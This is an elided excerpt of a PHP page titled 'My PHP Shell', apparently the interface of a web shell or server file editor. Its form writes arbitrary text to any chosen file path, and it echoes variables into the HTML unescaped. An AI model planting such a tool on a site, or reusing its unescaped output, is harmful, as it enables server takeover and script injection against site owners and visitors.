...
<html>
<head>
<title>My PHP Shell <?php echo VERSION;?></title>
<style>
...
<body>
	<?php if($error !=""){?><div align="center" class="error"><?php echo $error;?></div><br /><?php }?>
	<form method="post" action="" enctype="multipart/form-data" >
	<div align="left">
		<strong>Save to file path: </strong><input type="text" style="width: 90%;" name="filepath" value="<?php echo $file;?>" /><br />
	</div>
	<div align="center" style="clear: both;">
		<textarea name="content" rows="39" wrap="off"><?php echo $content;?></textarea><br />
	</div>
...
<?php if($error !=""){?><br /><div align="center" class="error"><?php echo $error;?></div><br /><?php }?>
<hr>
